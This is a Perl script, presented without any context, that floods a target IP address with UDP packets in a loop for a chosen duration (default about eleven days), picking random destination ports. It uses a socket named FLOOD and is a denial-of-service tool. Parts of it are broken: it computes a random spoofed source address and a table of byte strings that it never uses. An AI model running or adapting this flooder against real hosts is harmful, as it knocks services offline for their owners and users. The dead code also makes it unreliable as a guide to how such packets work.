#!/usr/bin/perl

use Socket qw(inet_aton pack_sockaddr_in AF_INET SOCK_DGRAM);
use strict;

my ($ip, $port, $time, $config) = @ARGV;
my ($size, $psize, $iaddr, $endtime, $pport);

$size = int(rand(3007)); # randomize packet size within a range
$psize = int(rand(3007)); # randomize packet size within a range

$iaddr = inet_aton($ip) or die "Cannot resolve hostname $ip";
$endtime = time() + ($time ? $time : 1000000);
socket(FLOOD, AF_INET, SOCK_DGRAM, 0);

my @hex_strings = (
    "\x9A\x3E\x67\xFA\xBB\x54\x32\xED\xD8\xA1\x5C\x8F\xE0\x2B\x4D\x1A",
    "\x70\x8C\x2E\x91\x6F\xD3\xBE\xA7\xFF\x62\x4A\xE5\xC1\x3D\x58\x09",
    "\x1B\xAF\x97\x53\xC6\xD0\xE2\x78\x69\x2C\xAA\x4F\x86\x5E\xFD\xA2",
    "\xCF\x42\x7E\x19\xA8\x3D\x51\xED\x70\xB6\x8F\x24\x5A\xDE\x96\x6C",
    "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f",
    "\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f",
    "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f",
    "\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f",
    "\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f",
    "\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f",
    "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f",
    "\x00\xFF\x02\xEB\x04\xAC\x06\x71\x08\xD5\x0A\x3F\x0C\xDB\x0E\x6E",
    "\x23\x11\xF2\xA3\x74\x56\x12\xC7\x1F\xB3\x5A\x9F\x7C\x34\xAF\x2D",
    "\x87\xBF\x32\xE5\xC4\x89\x90\x16\x44\x66\xEE\xBB\xDD\x98\x25\x5A",
    "\xAF\x7B\x94\x3F\x6C\x85\x12\xF0\x5D\x32\xF6\x45\x32\xCD\xA2\xFF"
);

for (; time() <= $endtime;) {
    $psize = $size ? $size : int(rand(3007));
    $pport = $port ? $port : int(rand(65535)) + 1; # using a larger range for port numbers

    my $src_ip = join('.', map int rand 256, 1..4);
    my $dst_ip = $ip;

    my $packet_header = pack('C C n n C N N N', 0x46, 1, 20 + length($hex_strings[0]), 0, 40, 255, 0, 0);
    my $packet = $packet_header . $hex_strings[0];

    send(FLOOD, $packet, 0, pack_sockaddr_in($pport, inet_aton($dst_ip)));
}
